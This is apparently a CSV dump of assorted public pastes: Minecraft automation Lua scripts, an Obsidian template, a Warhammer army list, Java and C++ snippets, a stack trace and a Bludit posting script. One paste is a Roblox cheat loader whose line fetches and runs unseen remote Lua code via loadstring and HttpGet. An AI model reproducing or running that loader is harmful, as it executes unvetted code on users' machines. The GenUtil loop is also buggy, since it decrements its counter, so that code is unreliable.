id,title,username,language,date,content
iJV2HT8c,CobbleGen,ChicagoFire3,Lua,Sunday 8th of June 2025 09:49:17 AM CDT,"require ""GenUtil""

print('Begin Cobble gen...')

while true do
  ReFuel(false)
  turtle.digDown()
  EmptyForward(1)
end"
h1uPUpSd,GenUtil,ChicagoFire3,Lua,Sunday 8th of June 2025 09:46:42 AM CDT,"function ReFuel(Silent)
  if not Silent then
    print('Refueling...')
  end
  local SavedSlot = turtle.getSelectedSlot()
  turtle.select(1)
  if not Silent then
    local ItemCount = turtle.getItemCount()
  end
  turtle.refuel()
  if not Silent then
    local FuelCount = turtle.getFuelLevel()
    local NewItemCount = turtle.getItemCount()
    print('New FuelCount: ', tostring(FuelCount))
    print('Items consumed: ', tostring(ItemCount - NewItemCount))
  end
  turtle.select(SavedSlot)
end

function EmptyForward(SkipSlotCount)
  print('Emptying inventory besides: ', tostring(SkipSlotCount))
  local SavedSlot = turtle.getSelectedSlot()
  local i = SkipSlotCount+1

  while i < 17 do
    turtle.select(i)
    turtle.drop()
    i = i-1
  end
  turtle.select(SavedSlot)
end"
SwZYn783,garden script egg,Guitar1203,Lua,Sunday 8th of June 2025 08:28:24 AM CDT,"getgenv().PETS = {
     ""Red Fox""
}

loadstring(game:HttpGet(""https:api.luarmor.net/files/v3/loaders/19919f511ace07999bf5a772208c8bef.lua""))()"
RQPuDmJt,Obsidian template,Icalized,JavaScript,Sunday 8th of June 2025 08:04:34 AM CDT,"<%*
//Get file title
let title = tp.file.title;
if(title.toLowerCase().startsWith(""untitled"")){
title = await tp.system.prompt(""Title:"");
await tp.file.rename(title);
}

// --- Get Category ---
let category = await tp.system.prompt(""Category:"");
if (category === """"){
	// Force format
	category += ""/general"";
}
const folder = category;

// --- Create Folder ---
const folderPath = `${folder}/`;
if (!await app.vault.adapter.exists(folderPath)) {
  await app.vault.createFolder(folderPath);
}

// --- Move Note ---
await tp.file.move(`${folderPath}${title}.md`);


%>

Created : <% tp.date.now(""dddd, MMMM Do YYYY, h:mm:ss a"") %>
Curated Links :
Auto Links:

___
<% tp.file.cursor() %>

# References
"
UYA0UFCT,Ottawa R3 TS,TableTopLive,PHP,Sunday 8th of June 2025 07:45:14 AM CDT,"Ottawa Teams (2000 points)

Thousand Sons
Strike Force (2000 points)
Grand Coven


CHARACTERS

Daemon Prince of Tzeentch with Wings (195 points)
• Warlord
• 1x Dark Blessing
1x Hellforged weapons
1x Infernal cannon
• Enhancement: Eldritch Vortex of E’Taph

Exalted Sorcerer on Disc of Tzeentch (115 points)
• 1x Arcane Fire
1x Force weapon
1x Inferno bolt pistol
• Enhancement: Incandaeum

Infernal Master (105 points)
• 1x Fires of the Abyss
1x Force weapon
1x Inferno bolt pistol
• Enhancement: Umbralefic Crystal

Infernal Master (85 points)
• 1x Fires of the Abyss
1x Force weapon
1x Inferno bolt pistol

Infernal Master (85 points)
• 1x Fires of the Abyss
1x Force weapon
1x Inferno bolt pistol

Sorcerer (75 points)
• 1x Force weapon
1x Inferno bolt pistol
1x Pandaemonic Delusion
1x Prosperine khopesh

Sorcerer (75 points)
• 1x Force weapon
1x Inferno bolt pistol
1x Pandaemonic Delusion
1x Prosperine khopesh

Tzaangor Shaman (55 points)
• 1x Baleful Devolution
1x Force stave


BATTLELINE

Rubric Marines (100 points)
• 1x Aspiring Sorcerer
• 1x Force weapon
1x Malefic Curse
1x Warpflame pistol
• 4x Rubric Marine
• 4x Close combat weapon
1x Icon of Flame
1x Soulreaper cannon
3x Warpflamer

Rubric Marines (100 points)
• 1x Aspiring Sorcerer
• 1x Force weapon
1x Malefic Curse
1x Warpflame pistol
• 4x Rubric Marine
• 4x Close combat weapon
1x Icon of Flame
1x Soulreaper cannon
3x Warpflamer

Rubric Marines (100 points)
• 1x Aspiring Sorcerer
• 1x Force weapon
1x Malefic Curse
1x Warpflame pistol
• 4x Rubric Marine
• 4x Close combat weapon
1x Icon of Flame
1x Soulreaper cannon
3x Warpflamer

Rubric Marines (100 points)
• 1x Aspiring Sorcerer
• 1x Force weapon
1x Malefic Curse
1x Warpflame pistol
• 4x Rubric Marine
• 4x Close combat weapon
1x Icon of Flame
3x Inferno boltgun
1x Soulreaper cannon

Rubric Marines (100 points)
• 1x Aspiring Sorcerer
• 1x Force weapon
1x Malefic Curse
1x Warpflame pistol
• 4x Rubric Marine
• 4x Close combat weapon
1x Icon of Flame
3x Inferno boltgun
1x Soulreaper cannon


DEDICATED TRANSPORTS

Chaos Rhino (90 points)
• 1x Armoured tracks
1x Havoc launcher
1x Inferno combi-bolter
1x Inferno combi-weapon

Chaos Rhino (90 points)
• 1x Armoured tracks
1x Havoc launcher
1x Inferno combi-bolter
1x Inferno combi-weapon


OTHER DATASHEETS

Forgefiend (140 points)
• 3x Ectoplasma cannon
1x Forgefiend claws

Mutalith Vortex Beast (160 points)
• 1x Betentacled maw
1x Mutalith claws
1x Warp vortex

Tzaangor Enlightened with Fatecaster Greatbows (80 points)
• 1x Aviarch
• 1x Close combat weapon
1x Fatecaster greatbow
• 5x Enlightened
• 5x Close combat weapon
5x Fatecaster greatbow

Tzaangor Enlightened with Fatecaster Greatbows (80 points)
• 1x Aviarch
• 1x Close combat weapon
1x Fatecaster greatbow
• 5x Enlightened
• 5x Close combat weapon
5x Fatecaster greatbow

Tzaangors (70 points)
• 1x Twistbray
• 1x Tzaangor blades
• 9x Tzaangor
• 1x Brayhorn
1x Herd banner
9x Tzaangor blades"
RWqZM1L8,Pupupupu,maz1lovo,Lua,Sunday 8th of June 2025 07:36:46 AM CDT,"--[[
The specified software is distributed under the CC0 license
No Rights Reserved
]] --
 
local ore_dict = {
    {
        ""Железная руда"",
        ""Железный слиток"",
        take = {name = ""minecraft:iron_ore"", damage = 0},
        give = {name = ""minecraft:iron_ingot"", damage = 0},
        rate = {take = 4, give = 9}
    },
    {
        ""Золотая руда"",
        ""Золотой слиток"",
        take = {name = ""minecraft:gold_ore"", damage = 0},
        give = {name = ""minecraft:gold_ingot"", damage = 0},
        rate = {take = 4, give = 9}
    },
    {
        ""Медная руда"",
        ""Медный слиток"",
        take = {name = ""IC2:blockOreCopper"", damage = 0},
        give = {name = ""IC2:itemIngot"", damage = 0},
        rate = {take = 4, give = 9}
    },
    {
        ""Медная руда"",
        ""Медный слиток"",
        take = {name = ""ProjRed:Exploration:projectred.exploration.ore"", damage = 3},
        give = {name = ""IC2:itemIngot"", damage = 0},
        rate = {take = 4, give = 9}
    },
    {
        ""Медная руда"",
        ""Медный слиток"",
        take = {name = ""Forestry:resources"", damage = 1},
        give = {name = ""IC2:itemIngot"", damage = 0},
        rate = {take = 4, give = 9}
    },
    {
        ""Оловянная руда"",
        ""Оловянный слиток"",
        take = {name = ""IC2:blockOreTin"", damage = 0},
        give = {name = ""IC2:itemIngot"", damage = 1},
        rate = {take = 4, give = 9}
    },
    {
        ""Оловянная руда"",
        ""Оловянный слиток"",
        take = {name = ""Forestry:resources"", damage = 2},
        give = {name = ""IC2:itemIngot"", damage = 1},
        rate = {take = 4, give = 9}
    },
    {
        ""Оловянная руда"",
        ""Оловянный слиток"",
        take = {name = ""ProjRed:Exploration:projectred.exploration.ore"", damage = 4},
        give = {name = ""IC2:itemIngot"", damage = 1},
        rate = {take = 4, give = 9}
    },
    {
        ""Свинцовая руда"",
        ""Свинцовый слиток"",
        take = {name = ""IC2:blockOreLead"", damage = 0},
        give = {name = ""IC2:itemIngot"", damage = 5},
        rate = {take = 4, give = 9}
    },
    {
        ""Серебряная руда"",
        ""Серебрянный слиток"",
        take = {name = ""ProjRed:Exploration:projectred.exploration.ore"", damage = 5},
        give = {name = ""IC2:itemIngot"", damage = 6},
        rate = {take = 4, give = 9}
    },
    {
        ""Серебряная руда"",
        ""Серебрянный слиток"",
        take = {name = ""ThermalFoundation:Ore"", damage = 2},
        give = {name = ""IC2:itemIngot"", damage = 6},
        rate = {take = 4, give = 9}
    },
    {
        ""Серебрянная руда"",
        ""Серебрянный слиток"",
        take = {name = ""ThermalFoundation:Ore"", damage = 4},
        give = {name = ""ThermalFoundation:material"", damage = 36},
        rate = {take = 1, give = 2}
    }
}
 
local unicode = require(""unicode"")
local computer = require(""computer"")
local com = require(""component"")
local event = require(""event"")
local me = com.isAvailable(""me_interface"") and com.me_interface or error(""нет ме интерфейса"")
local pim = com.isAvailable(""pim"") and com.pim or error(""нет пима"")
 
local gpu = com.gpu
local w, h = 80, 50
local defBG, defFG = gpu.getBackground(), gpu.getForeground()
gpu.setResolution(w, h)
 
local function center(height, text, color)
    gpu.setForeground(color)
    gpu.set(math.floor(w / 2 - unicode.len(text) / 2), height, text)
end
 
local function populateQty()
    local totalOre = 0
    for i, ore in pairs(ore_dict) do
        local fingerprint = {id = ore.give.name, damage = ore.give.damage}
        local item = me.getItemDetail(fingerprint).basic()
        if item == nil then
            return 0
        else
            ore.sizeOfStack = item.max_size
            ore.qty = item.qty
            totalOre = totalOre + item.qty
        end
    end
    return totalOre
end
 
local function displayOres()
    local line = 2
    for i, ore in pairs(ore_dict) do
        local print_row = line + (i)
 
        gpu.setForeground(0x00ff00)
        gpu.set(5, print_row, ore[1])
        gpu.set(42, print_row, ore[2])
 
        gpu.setForeground(0xFF00FF)
        gpu.set(28, print_row, tostring(ore.rate.take))
        gpu.set(34, print_row, tostring(ore.rate.give))
        gpu.set(73, print_row, tostring(ore.qty))
 
        gpu.setForeground(0xFFFF00)
        gpu.set(30, print_row, ""-->"")
        gpu.set(63, print_row, ""Доступно:"")
        gpu.setForeground(0x202020)
        gpu.set(2, print_row + 1, string.rep(""═"", w - 2))
        line = line + 1
    end
end
 
local function updateOres()
    local totalOre = populateQty()
    gpu.fill(1, 1, w, h - 16, "" "")
    if totalOre == 0 then
        gpu.fill(1, 1, w, h - 15, "" "")
        center(h - 15, ""Нет соединения с МЭ"", 0xff0000)
    else
        displayOres()
    end
end
 
local function giveItemFromMe(item, dmg, amount)
    local fingerprint = {id = item, dmg = dmg}
    local err, res = pcall(me.exportItem, fingerprint, ""UP"", amount)
    if err == true then
        return res.size
    end
end
 
local function giveIngot(toGive, ore)
    local totalGive = 0
    local givePreIteration = 0
    while totalGive < toGive do
        if toGive - totalGive > 64 then
            givePreIteration = ore.sizeOfStack
        else
            givePreIteration = toGive - totalGive
        end
 
        local gived = giveItemFromMe(ore.give.name, ore.give.damage, givePreIteration)
 
        totalGive = totalGive + gived
        if gived == 0 then
            gpu.fill(1, h - 15, w, 2, "" "")
            center(h - 15, ""Oсвободите место в инвентаре"", 0xff0000)
            center(h - 14, ""Ожидаю выдать "" .. tostring(toGive - totalGive) .. "" "" .. ore[2], 0xFFFFFF)
            os.sleep(1)
        end
        gpu.fill(1, h - 15, 2, h, "" "")
    end
end
 
local function exchangeOre(slot, ore)
    local curSlot = pim.getStackInSlot(slot)
    if curSlot == nil then
        center(h - 14, ""Вы сошли с PIM, обмен прерван. (Не удалось прочесть слот)"", 0xff0000)
        os.sleep(0.5)
        return
    end
    local userOreQty = curSlot.qty
    local takeQty = userOreQty - (userOreQty % ore.rate.take)
    local giveQty = userOreQty * ore.rate.give
    if ore.qty < giveQty then
        gpu.fill(1, h - 14, w, 1, "" "")
        center(h - 14, ""Недостаточно слитков для обмена <"" .. ore[1] .. "">"", 0xff0000)
        os.sleep(0.5)
        return
    end
    -- Количетсво могло измениться..
    local takedOre = pim.pushItem(""DOWN"", slot, takeQty)
 
    if takedOre == nil then
        gpu.fill(1, h - 14, w, 1, "" "")
        center(h - 14, ""Вы сошли с PIM, обмен прерван. (Не удалось извлечь руду)"", 0xff0000)
        os.sleep(0.5)
    elseif takedOre == 0 then
        gpu.fill(1, h - 14, w, 1, "" "")
        center(h - 14, ""В выбраном слоте руды нет.. А была.. Хмм..."", 0x505050)
    else
        local giveQty = (takedOre // ore.rate.take) * ore.rate.give
        gpu.fill(1, h - 15, w, 2, "" "")
        center(h - 14, ""Меняю  "" .. takedOre .. ""  "" .. ore[1] .. ""  на  "" .. giveQty .. ""  "" .. ore[2], 0xffffff)
        giveIngot(giveQty, ore)
    end
end
 
local function checkInventory()
    local size = pim.getInventorySize()
    local data = pim.getAllStacks(0)
 
    for slot = 1, size do
        if data[slot] then
            for i, ore in pairs(ore_dict) do
                if data[slot].id == ore.take.name and data[slot].dmg == ore.take.damage then
                    exchangeOre(slot, ore)
                end
            end
        end
    end
 
    updateOres()
 
    if pim.getInventoryName() ~= ""pim"" then
        gpu.fill(1, h - 15, w, 2, "" "")
        center(h - 15, ""Обмен окончен! Приходите ещё!"", 0xffffff)
 
        checkInventory()
    else
        -- Может быть, мы не поймали событие когда юзер ушел
        event.push(""player_off"")
    end
end
 
function handleEvent(eventID, ...)
    local args = {...}
    if eventID == ""interrupted"" then
        gpu.setBackground(defBG)
        gpu.setForeground(defFG)
        gpu.fill(1, 1, w, h, "" "")
        os.exit()
        return true
    elseif eventID == ""player_on"" then
        gpu.fill(1, h - 15, w, 1, "" "")
        center(h - 15, ""Приветствую, "" .. args[1] .. ""! Начинаю обмен"", 0xffffff)
        updateOres()
        checkInventory()
    elseif eventID == ""player_off"" then
        gpu.fill(1, h - 15, w, 1, "" "")
        center(h - 15, ""Для обмена встаньте на PIM и не сходите до окончания обмена"", 0xffffff)
        updateOres()
    end
end
 
function drawStat()
    gpu.setForeground(0x444444)
    gpu.set(
        2,
        h - 1,
        string.format(
            ""RAM: %.1fkB / %.1fkB"",
            (computer.totalMemory() - computer.freeMemory()) / 1024,
            computer.totalMemory() / 1024
        )
    )
end
 
local oreTimeFn = function()
    updateOres()
    -- Каджый 10 такт обновляем экран
    for i = 1, 10 do
        coroutine.yield()
    end
end
local oreTimer = coroutine.create(oreTimeFn)
 
function draw_img(img, x, y, fore, back)
    fore = fore or 0xffffff
    back = back or 0x0
    oldFG = gpu.getForeground()
    gpu.setForeground(fore)
    local i = 0
    for line in img:gmatch(""([^\n]*)\n?"") do
        gpu.set(x, y + i, line)
        i = i + 1
    end
    gpu.setForeground(oldFG)
end
local img =
    [[
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡐⢆⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠠⡐⣄⢢⡐⢄⢢⡐⣄⠂⡄⠀⠀⢄⢢⢰⣀⢦⡐⣄⢢⡐⠄⣂⠆⠀⠀⢀⡐⢦⠹⠌⠀⢀⡰⢠⠀⠐⣠⠀⠀⠀⠀⠀⠀⠀⠀⠄⡐⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢡⠂⡄⠀⠀⠀⠀⠌⡤⠃⠀⢳⡌⠃⠘⠈⠂⠑⠈⠑⠀⠀⡜⡢⠍⠂⠑⠈⠑⠈⠃⠀⠐⣌⠎⢀⡐⠦⣜⠂⠁⠀⠀⠀⡜⡡⠂⠘⠤⡁⠀⠀⠀⠀⠀⠀⠀⢂⠱⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢢⠑⡌⢢⠀⠤⣉⡜⣰⠁⠀⡣⢝⠀⠀⠀⠀⠀⠀⠀⠀⢀⠳⣹⢌⡱⢢⡱⢌⢲⢰⡀⠀⢎⠺⣤⣙⠳⣀⠀⠀⠀⠀⠠⣙⠦⠁⢨⣑⠂⠀⠀⠀⠀⠀⠀⠀⢌⠳⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢢⡑⠈⠒⡭⠒⠌⠸⣡⠃⠀⣙⠮⡄⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠈⠁⠁⠉⣈⠞⡢⠄⠈⢎⡳⠂⠉⠳⢆⡆⣀⠀⠀⠐⡌⠦⠁⠠⣃⠎⠀⠀⠀⠀⠀⠀⠀⠌⢒⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠒⡄⠁⠀⠀⠁⠀⠰⣡⠂⠀⠈⠸⣑⢋⢆⢳⡘⣔⠣⢆⢠⠱⣊⡕⣎⢖⡱⢎⠞⠁⠀⠈⣎⠱⠀⠀⠀⠈⠲⣡⠢⠄⠀⡜⡡⠂⠐⡥⢊⡴⢡⠎⡤⢁⠆⠀⠘⡀⠎⡐⢂⠰⠀⠆⡀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⢌⡁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ]]
 
function copyleft()
    local text = {
        {""Авторы: "", 0x444444, w - 35},
        {""Rijen, Furryonelove"", 0x64fff2, w - 28}
    }
    local startPos = w - 32
    for i, str in pairs(text) do
        gpu.setForeground(str[2])
        gpu.set(str[3], h - 1, str[1])
    end
 
    gpu.setBackground(defBG)
    gpu.setForeground(defFG)
end
 
gpu.fill(1, 1, w, h, "" "")
center(h - 15, ""Для обмена встаньте на PIM и не сходите до окончания обмена"", 0xffffff)
draw_img(img, 1, h - 13, 0x00a400)
copyleft()
 
while true do
    drawStat()
 
    handleEvent(event.pull(1))
 
    if coroutine.status(oreTimer) == ""dead"" then
        oreTimer = coroutine.create(oreTimeFn)
    else
        coroutine.resume(oreTimer)
    end
end"
UzmX69k2,Napredno tips,dzocesrce,Java,Sunday 8th of June 2025 07:25:46 AM CDT,"1. GROUPING BY EXAMPLE    
public Map<Integer, Set<File>> byYear() {
        return files.stream()
                .collect(Collectors.groupingBy(
                        file -> file.getCreateAt().getYear(),
                        Collectors.toSet()
                ));
    }
2. GROUPING BY EXAMPLE
Map<String, Set<Employee>> employeesByLevels = employees.stream()
                .filter(i -> levels.contains(i.getLevel()))
                .collect(Collectors.groupingBy(
                        Employee::getLevel,
                        TreeMap::new, // map sorted by key
                        Collectors.toCollection(() -> new TreeSet<>(Comparator.comparing(Employee::getSalary,Comparator.reverseOrder()))) // values sorted too
                ));
            return employeesByLevels;

3. SORTING IN A MAP
Map<String, List<Shape>> shapesByUser = shapes.stream()
                .collect(Collectors.groupingBy(
                        Shape::getId,
                        Collectors.toList()
                ))
                .entrySet()
                .stream()
                .sorted(Comparator
                        .<Map.Entry<String, List<Shape>>>comparingInt(e -> e.getValue().size())
                        .reversed()
                        .thenComparingDouble(e -> e.getValue().stream().mapToDouble(Shape::getArea).sum())
                        .reversed()
                )
                .collect(Collectors.toMap(
                        Map.Entry::getKey,
                        e -> e.getValue().stream()
                                .sorted(Comparator.comparingDouble(Shape::getPerimeter).reversed())
                                .collect(Collectors.toList()),
                        (e1, e2) -> e1,
                        LinkedHashMap::new
                ));

4. ATOMIC INTEGER

AtomicInteger counter = new AtomicInteger(1);
        paymentList.stream().filter(i->i.index.equals(id))
                .sorted(Comparator.comparing(Payment::getPrice,Comparator.reverseOrder()))
                .forEach(i->printStream.println(String.format(""%d. %s %d"",
                        counter.getAndIncrement(),i.title,i.price)));

5. FLATMAP 

studentsByBranch = studentsByBranch.entrySet().stream().sorted(
                Comparator.comparingLong(e->e.getValue().stream().flatMap(i->i.getGrades()
                        .stream()).filter(i->i==10).count())
        ).collect(Collectors.toMap(
                Map.Entry::getKey,
                Map.Entry::getValue,
                (e1,e2)->e1,
                LinkedHashMap::new
        ));
        List<String> branches = studentsByBranch.keySet().stream().collect(Collectors.toList()).reversed();
        for(String branch : branches){
            Map<Integer,Long> numberOfStudentsPerGrade = studentsByBranch.get(branch).stream()
                    .flatMap(s -> s.getGrades().stream())
                    .collect(Collectors.groupingBy(
                    e->e.intValue(),
                    TreeMap::new,
                    Collectors.counting()
            ));
            printStream.println(branch);
            numberOfStudentsPerGrade.entrySet().stream().forEach(
                    i-> printStream.println(String.format(""%d | (%d)"",i.getKey(),i.getValue()))
            );
        }

6. COLLECTORS JOINING
String[] allCourses = studentsByIndex.values().stream()
                .map(i->i.getCoursesByTerm().values().stream().flatMap(c->c.stream()).collect(Collectors.joining("","")))
                .collect(Collectors.joining("","")).split("","");

7. MORE MAP SORTING

gamesByTeam.entrySet().stream()
                .sorted(Comparator.comparing(
                                (Map.Entry<String, Team> e) -> e.getValue().getPoints(),
                                Comparator.reverseOrder())
                        .thenComparing(e -> e.getValue().getGoalDifference(),
                                Comparator.reverseOrder())
                        .thenComparing(e->e.getKey()))


8. MAP GROUPING BY 0 PROBLEM

  return IntStream.range(5, 11)
                .boxed()
                .collect(Collectors.toMap(
                        grade -> grade,
                        grade -> studentsByGrade.getOrDefault(grade, 0L),
                        (a, b) -> a,
                        TreeMap::new
                ));"
FPJYSFWq,Untitled,Josif_tepe,C++,Sunday 8th of June 2025 06:48:16 AM CDT,"#include <iostream>
#include <cstring>
using namespace std;
string a, b;
int dp[1001][1001];
int rec(int i, int j) {
    if(i < 0 or j < 0) {
        return 0;
    }
    if(dp[i][j] != -1) {
        return dp[i][j];
    }
    int res = 0;
    res = max(res, rec(i - 1, j));
    res = max(res, rec(i, j - 1));
    
    if(a[i] == b[j]) {
        res = max(res, rec(i - 1, j - 1) + 1);
    }
    dp[i][j] = res;
    return res;
}
int main()
{
    cin >> a >> b;
    memset(dp, -1, sizeof dp);
    cout << rec(a.size() - 1, b.size() - 1) << endl;
    
    return 0;
}
"
jLkmp8Ut,2025-06-08T13:40:04.280,powerampache,PHP,Sunday 8th of June 2025 06:40:04 AM CDT,"1.01-76 (76) - DB: 83
luci.sixsixsix.powerampache2.domain.errors.NullSessionException: Session is NULL
	at luci.sixsixsix.powerampache2.data.BaseAmpacheRepository.authToken(BaseAmpacheRepository.kt:87)
	at luci.sixsixsix.powerampache2.data.BaseAmpacheRepository$authToken$1.invokeSuspend(Unknown Source:14)
	at kotlin.coroutines.jvm.internal.BaseContinuationImpl.resumeWith(ContinuationImpl.kt:33)
	at kotlinx.coroutines.DispatchedTask.run(DispatchedTask.kt:104)
	at android.os.Handler.handleCallback(Handler.java:938)
	at android.os.Handler.dispatchMessage(Handler.java:99)
	at android.os.Looper.loop(Looper.java:236)
	at android.app.ActivityThread.main(ActivityThread.java:8061)
	at java.lang.reflect.Method.invoke(Native Method)
	at com.android.internal.os.RuntimeInit$MethodAndArgsCaller.run(RuntimeInit.java:656)
	at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:967)

scrobble() - generic exception {""detailMessage"":""Session is NULL"",""stackTrace"":[],""suppressedExceptions"":[]}"
c9qu21NJ,dataNone,TestGuy1,JSON,Sunday 8th of June 2025 06:00:06 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: 'aba446e77af8139e94254921546491b56ec24e4cc0ffa41b66baf423de826b2ce83dcb57c9bd18420e8ac71044d6f86511913556a95c39427d044361b0848e089047ae6993926f687bbe4146c89644b6ede3c989f73577e39e3e38db0b9bb13b8cb2bfa5d1b0614ad3a23f7d839b2e6dfa6b5877e6383b374c674f8bb7679535',
  otherdata: [
    '6612463442001a95108d500499c3809a',
    '6d85b241abdfbd500a18828ecdfef785',
    'ba5b12b133e246806ff13610847a755f',
    '8ab6f3edfc6d0a70818d5ac5e0230200',
    '8d927bae514f48692688744e823233bd',
    '8546011254e8e6bcc0467b299405fd64',
    'abb1e78c402d9c3966614b53ebd32611',
    'eb8e7bf3f1efa7cbec38c57f132456f6'
  ]
}"
uhvjbgt3,CLI Bludit,snick512,Bash,Sunday 8th of June 2025 05:05:38 AM CDT,"#!/bin/bash
# Create .page_config
# API_URL=""https://example.com/api/pages""
# TOKEN=""""
# AUTH=""""
# 
set -euo pipefail

# Load secure configuration
CONFIG_FILE="".page_config""
if [[ ! -f ""$CONFIG_FILE"" ]]; then
    echo ""❌ Missing .page_config file. Please create it with API_URL, TOKEN, and AUTH.""
    exit 1
fi
source ""$CONFIG_FILE""

# --- Parse command-line arguments ---
TITLE=""""
TAGS=""""
while [[ ""$#"" -gt 0 ]]; do
    case ""$1"" in
        --title)
            TITLE=""$2""
            shift 2
            ;;
        --tags)
            TAGS=""$2""
            shift 2
            ;;
        *)
            echo ""❌ Unknown option: $1""
            echo ""Usage: $0 --title \""My Title\"" --tags \""tag1,tag2\""""
            exit 1
            ;;
    esac
done

# --- Validate input ---
if [[ -z ""$TITLE"" || -z ""$TAGS"" ]]; then
    echo ""❌ Error: Both --title and --tags are required.""
    exit 1
fi

# --- Sanitize title into slug ---
SLUG=$(echo ""$TITLE"" | tr '[:upper:]' '[:lower:]' | sed -E 's/[^a-z0-9 ]//g' | tr ' ' '-' | sed 's/-\+/-/g' | sed 's/^-//;s/-$//')

# --- Secure temp file for markdown input ---
TMP_FILE=$(mktemp ""/tmp/markdown_XXXXXX.md"")
trap 'shred -u ""$TMP_FILE"" 2>/dev/null' EXIT

echo ""# Replace with your content"" > ""$TMP_FILE""
${EDITOR:-nano} ""$TMP_FILE""

# --- Read Markdown content ---
CONTENT=$(<""$TMP_FILE"")

# --- Secure JSON construction (no temp payload file) ---
JSON=$(jq -n \
    --arg token ""$TOKEN"" \
    --arg auth ""$AUTH"" \
    --arg title ""$TITLE"" \
    --arg content ""$CONTENT"" \
    --arg slug ""$SLUG"" \
    --arg tags ""$TAGS"" \
    '{
      token: $token,
      authentication: $auth,
      title: $title,
      content: $content,
      slug: $slug,
      tags: $tags
    }')

# --- Send POST request ---
echo ""🚀 Posting securely to $API_URL ...""
RESPONSE=$(curl -s -X POST ""$API_URL"" \
    -H ""Content-Type: application/json"" \
    -d ""$JSON"")

# --- Show response ---
echo ""📬 Response:""
echo ""$RESPONSE""
"
